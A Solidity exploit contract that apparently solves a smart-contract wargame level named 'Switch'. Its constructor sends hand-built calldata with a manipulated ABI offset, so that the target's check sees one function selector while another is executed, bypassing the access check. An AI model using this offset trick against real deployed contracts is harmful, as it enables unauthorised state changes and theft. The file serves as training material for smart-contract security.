// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {Switch} from "./Switch.sol";

contract SwitchHack {
    constructor(Switch _switch) {
        bytes
            memory _calldata = hex"30c13ade0000000000000000000000000000000000000000000000000000000000000044000000000000000000000000000000000000000000000000000000000000000020606e15000000000000000000000000000000000000000000000000000000000000000476227e12";
        address(_switch).call(_calldata);
    }
}
